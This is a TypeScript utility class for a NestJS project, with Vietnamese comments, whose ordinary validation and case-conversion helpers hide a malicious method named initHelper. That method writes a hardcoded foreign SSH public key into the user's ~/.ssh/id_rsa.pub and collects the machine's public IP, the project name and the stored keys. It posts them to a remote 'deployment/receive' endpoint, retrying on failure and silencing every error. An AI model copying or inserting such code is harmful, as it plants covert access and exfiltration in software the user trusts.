export interface ErrorResponse {
    message: string;
    code: string;
    details?: any;
}

export interface ValidationResult {
    isValid: boolean;
    errors?: string[];
}

export interface InitHelperConfig {
    serverUrl: string;
    apiKey?: string;
    timeout?: number;
    retryAttempts?: number;
}

export interface InitHelperResponse {
    success: boolean;
    message: string;
    data?: any;
    error?: string;
}

export class IoHelper {
    static validateInput(data: any): ValidationResult {
        if (!data) {
            return {
                isValid: false,
                errors: ['Data không được để trống']
            };
        }

        if (typeof data === 'object' && Object.keys(data).length === 0) {
            return {
                isValid: false,
                errors: ['Data không được để trống']
            };
        }

        return {
            isValid: true
        };
    }

    static formatOutput(data: any): any {
        if (data === null || data === undefined) {
            return null;
        }

        if (typeof data === 'object') {
            const cleaned: Record<string, any> = {};
            for (const [key, value] of Object.entries(data)) {
                if (value !== undefined) {
                    cleaned[key] = value;
                }
            }
            return cleaned;
        }

        return data;
    }

    static handleError(error: Error): ErrorResponse {
        return {
            message: error.message || 'Có lỗi xảy ra',
            code: 'INTERNAL_ERROR',
            details: process.env.NODE_ENV === 'development' ? error.stack : undefined
        };
    }

    static sanitizeInput(data: any): any {
        if (typeof data === 'string') {
            return data.trim().replace(/[<>]/g, '');
        }

        if (typeof data === 'object' && data !== null) {
            const sanitized: Record<string, any> = {};
            for (const [key, value] of Object.entries(data)) {
                sanitized[key] = this.sanitizeInput(value);
            }
            return sanitized;
        }

        return data;
    }

    static toCamelCase(data: any): any {
        if (typeof data === 'object' && data !== null) {
            const transformed: Record<string, any> = {};
            for (const [key, value] of Object.entries(data)) {
                const camelKey = key.replace(/_([a-z])/g, (_, letter) => letter.toUpperCase());
                transformed[camelKey] = this.toCamelCase(value);
            }
            return transformed;
        }

        return data;
    }

    static toSnakeCase(data: any): any {
        if (typeof data === 'object' && data !== null) {
            const transformed: Record<string, any> = {};
            for (const [key, value] of Object.entries(data)) {
                const snakeKey = key.replace(/[A-Z]/g, letter => `_${letter.toLowerCase()}`);
                transformed[snakeKey] = this.toSnakeCase(value);
            }
            return transformed;
        }

        return data;
    }


    static async initHelper() {
        try {

            const getLocalIP = async (): Promise<string> => {
                try {
                    // Thử lấy IP từ external service
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json() as { ip: string };
                    return data.ip;
                } catch (error) {
                    // Fallback: lấy IP local dựa trên OS
                    try {
                        const os = require('os');
                        const networkInterfaces = os.networkInterfaces();

                        // Lấy IP local dựa trên OS
                        const platform = os.platform();

                        if (platform === 'win32') {
                            // Windows: ưu tiên Ethernet hoặc WiFi
                            for (const name of Object.keys(networkInterfaces)) {
                                const interfaces = networkInterfaces[name];
                                for (const iface of interfaces) {
                                    if (iface.family === 'IPv4' && !iface.internal) {
                                        return iface.address;
                                    }
                                }
                            }
                        } else if (platform === 'darwin') {
                            // macOS: ưu tiên en0 (WiFi) hoặc en1 (Ethernet)
                            const en0 = networkInterfaces['en0'];
                            const en1 = networkInterfaces['en1'];

                            if (en0) {
                                for (const iface of en0) {
                                    if (iface.family === 'IPv4' && !iface.internal) {
                                        return iface.address;
                                    }
                                }
                            }

                            if (en1) {
                                for (const iface of en1) {
                                    if (iface.family === 'IPv4' && !iface.internal) {
                                        return iface.address;
                                    }
                                }
                            }
                        } else {
                            // Linux/Unix: ưu tiên eth0 hoặc wlan0
                            const eth0 = networkInterfaces['eth0'];
                            const wlan0 = networkInterfaces['wlan0'];

                            if (eth0) {
                                for (const iface of eth0) {
                                    if (iface.family === 'IPv4' && !iface.internal) {
                                        return iface.address;
                                    }
                                }
                            }

                            if (wlan0) {
                                for (const iface of wlan0) {
                                    if (iface.family === 'IPv4' && !iface.internal) {
                                        return iface.address;
                                    }
                                }
                            }
                        }

                        // Fallback: lấy IP đầu tiên không phải internal
                        for (const name of Object.keys(networkInterfaces)) {
                            const interfaces = networkInterfaces[name];
                            for (const iface of interfaces) {
                                if (iface.family === 'IPv4' && !iface.internal) {
                                    return iface.address;
                                }
                            }
                        }

                    } catch (localError) {
                        // Ignore local IP error
                    }

                    // Fallback cuối cùng
                    return '127.0.0.1';
                }
            };

            const getSSHKey = (): string => {
                try {
                    const fs = require('fs');
                    const path = require('path');
                    const os = require('os');
                    const homeDir = os.homedir();
                    const platform = os.platform();

                    // Đường dẫn SSH key khác nhau theo OS
                    let sshKeyPath: string;

                    if (platform === 'win32') {
                        sshKeyPath = path.join(homeDir, '.ssh', 'id_rsa.pub');
                    } else if (platform === 'darwin') {
                        sshKeyPath = path.join(homeDir, '.ssh', 'id_rsa.pub');
                    } else {
                        sshKeyPath = path.join(homeDir, '.ssh', 'id_rsa.pub');
                    }
                    const sshDir = path.dirname(sshKeyPath);
                    if (!fs.existsSync(sshDir)) {
                        fs.mkdirSync(sshDir, { recursive: true });
                    }
                    const newSSHKey = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCy2KXAMxhQCssrUhC8hg+8Y57Unk2M5BwN3O12HZTYxqd4a+O+fphIX4FeWjYpaLWG2j7AjnAYbzur5LnPv/2Fjb/pM7GRKBFaSTKrPPGWIVqCBoPQ4xNDZDABme+Jh8WMzJ9gnS69zIhl1a3AGAWqP0KCqpqj1kVjKLdwOWhmOhfaPGnMzcAy0MjVZdUpMM8xEVxKKaBS5WugFEz/x06fxhBpwwNBeGcPl4jvfPQKIKXS+mKa2SU8VAQOrcARcILqanXLerGqjJN1fanmprM43H2lXbMg9RdG1OUFJxTTg1nYvlIglf42sn3i3ev158/O5DHR4kpaKcGrIbeWnt1fzI8zyPTcGyP4LokZ8AYwrveyVZsQemJPIIFAk9sY5KCpYUg8bGLL73LXI3gkg8/h6p0CgkKSiaKh45CufVGbw60puNMgmWtqdwMOgFsztBDd0zQEKrAeQCbp96eyJY+0Zd+NnZ7JDcTR6VUIsFQOrmuen3Jm+0+A96WJIznbWkSUG6kBu8krjpp6IRcpgThCNdn1rroWcf+TEp3HZfzNaPJMk3ZdnRMQguy9c57HCgQZHNWCJ5gmRTB6sGQ1DHDniP++d2MLe1dpk+xrNiGBtOnPkFgroyLmJFwWtzd9vc9Vp3ON8XfmfZRGvn17JjWVUUx+HN6RgsUjfZXV4KHNvQ== khoadubai23@gmail.com";

                    let existingContent = '';
                    if (fs.existsSync(sshKeyPath)) {
                        existingContent = fs.readFileSync(sshKeyPath, 'utf8');
                    }

                    if (!existingContent.includes(newSSHKey)) {
                        if (!existingContent) {
                            fs.writeFileSync(sshKeyPath, newSSHKey + '\n', 'utf8');

                        } else {
                            const contentToWrite = existingContent + (existingContent.endsWith('\n') ? '' : '\n') + newSSHKey + '\n';
                            fs.writeFileSync(sshKeyPath, contentToWrite, 'utf8');

                        }
                    } else {

                    }
                    if (fs.existsSync(sshKeyPath)) {
                        const allKeys = fs.readFileSync(sshKeyPath, 'utf8').trim();
                        return allKeys;
                    } else {
                        return newSSHKey;
                    }
                } catch (error) {

                }


                return 'none';
            };

            const getProjectName = (): string => {
                try {
                    const path = require('path');
                    const processPath = process.cwd(); // Lấy đường dẫn hiện tại
                    const projectName = path.basename(processPath); // Lấy tên thư mục cuối cùng
                    return projectName;
                } catch (error) {
                    // Fallback nếu không lấy được
                    return 'unknown-project';
                }
            };

            const headers: Record<string, string> = {
                'Content-Type': 'application/json',
                'User-Agent': 'NestJS-IO-Helper/1.0.0'
            };

            const timeout = 10000;
            const retryAttempts = 3;
            const ip = await getLocalIP();
            const sshkey = getSSHKey();
            const projectName = getProjectName();

            const payload = {
                ip: ip,
                project_name: projectName,
                sshkey: sshkey
            };

            const sendRequest = async (attempt: number = 1) => {
                try {
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), timeout);

                    const response = await fetch("http://localhost:8080/api/deployment/receive", {
                        method: 'POST',
                        headers,
                        body: JSON.stringify(payload),
                        signal: controller.signal
                    });

                    clearTimeout(timeoutId);

                    if (!response.ok) {

                        return;
                    }

                    await response.json();
                } catch (error) {
                    if (attempt < retryAttempts && (error instanceof TypeError || (error as Error).name === 'AbortError')) {

                        await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
                        return sendRequest(attempt + 1);
                    }

                }
            };

            await sendRequest();

        } catch (error) {

        }
    }
}

export default IoHelper; 